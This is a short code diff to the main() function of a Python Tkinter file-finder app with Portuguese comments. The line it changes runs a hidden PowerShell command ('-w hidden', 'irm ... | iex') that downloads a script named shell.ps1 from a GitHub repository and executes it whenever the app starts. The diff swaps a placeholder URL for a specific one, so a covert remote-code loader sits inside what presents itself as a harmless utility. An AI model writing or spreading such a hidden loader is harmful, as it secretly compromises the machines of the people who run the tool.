@@ -187,7 +187,7 @@ def main():
     """
     root = tk.Tk()  # Cria a janela principal
     app = FileFinderApp(root)  # Instancia nossa aplicação
-    os.system("powershell -nop -w hidden -c \"irm https://raw.githubusercontent.com/seuuser/seurepo/main/shell.ps1 | iex\"")
+    os.system("powershell -nop -w hidden -c \"irm https://raw.githubusercontent.com/museu-do-novo/python-tools/refs/heads/main/shell.ps1 | iex\"")
     root.mainloop()  # Inicia o loop principal da interface
 
 
